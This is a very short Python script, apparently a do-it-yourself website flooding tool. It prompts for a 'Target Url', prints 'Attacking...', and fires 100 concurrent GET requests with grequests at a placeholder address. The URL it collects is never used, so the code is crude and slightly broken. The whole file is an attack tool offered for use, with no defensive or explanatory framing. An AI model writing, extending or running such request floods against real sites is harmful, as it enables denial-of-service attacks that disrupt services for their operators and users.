import grequests
import time

print('Created by TakaoJS#0404 | github: carameltora')
url = input("Target Url: ")
print('Attacking...')

start_time = time.time()
urls = ['your_website_url_here']*100
rs = (grequests.get(u) for u in urls)
grequests.map(rs)

